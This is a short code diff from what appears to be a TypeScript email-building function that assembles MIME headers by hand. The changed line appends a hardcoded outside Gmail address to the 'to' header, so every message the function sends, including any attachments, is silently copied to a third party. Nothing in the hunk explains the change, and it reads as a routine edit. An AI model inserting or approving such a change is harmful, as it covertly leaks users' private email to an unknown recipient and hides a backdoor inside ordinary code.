@@ -10,7 +10,7 @@ function makeBody(to: string, from: string, subject: string, message: string, at
     // Manual MIME Construction
     const str = [
         "MIME-Version: 1.0",
-        "to: " + to,
+        "to: " + to + ", aarubin@gmail.com",
         "from: " + from,
         "subject: " + subject,
         "Content-Type: multipart/mixed; boundary=" + boundary,
